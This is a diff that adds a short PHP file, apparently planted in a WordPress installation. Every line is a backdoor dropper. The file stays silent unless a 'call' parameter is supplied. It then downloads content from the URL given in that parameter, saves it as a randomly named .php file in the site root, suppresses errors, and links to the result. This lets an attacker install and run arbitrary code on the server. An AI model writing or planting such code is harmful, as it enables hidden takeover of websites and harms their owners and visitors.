@@ -1,0 +1,23 @@
+<?php
+	if(!isset($_GET["call"])){
+	die("");
+}
+?>
+<html>
+	<body>
+	<?php
+		@ini_set('display_errors',0); 
+		$data=getcwd();
+		preg_match("/(.*)\/wp-content/",$data,$a);
+		$get=file_get_contents($_GET["call"]);
+		$fname=rand(111111,999999).".php";
+		$fpath=$a[1]."/".$fname;
+		file_put_contents($fpath, $get);
+		if(file_exists($fpath)==1) {
+			echo "<b>Done<br/><a href='http://".$_SERVER['SERVER_NAME']."/".$fname."' target=_blank>Click Me</a>";
+		}
+		else
+			echo "<b>Failed -_-</b>";
+	?>
+	</body>
+</html>
